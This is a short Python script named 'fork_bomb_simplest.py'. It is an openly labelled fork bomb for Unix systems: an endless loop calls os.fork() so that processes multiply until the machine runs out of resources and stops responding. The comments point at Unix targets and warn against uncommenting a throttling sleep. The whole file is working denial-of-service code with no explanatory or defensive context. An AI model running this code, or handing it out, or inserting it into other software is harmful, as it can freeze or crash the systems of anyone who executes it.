# fork_bomb_simplest.py
import os
# import time

while True:
    os.fork()
    # time.sleep(0.5) # DO NOT UNCOMMENT
    #FOR UNIX BASED SYSTEMS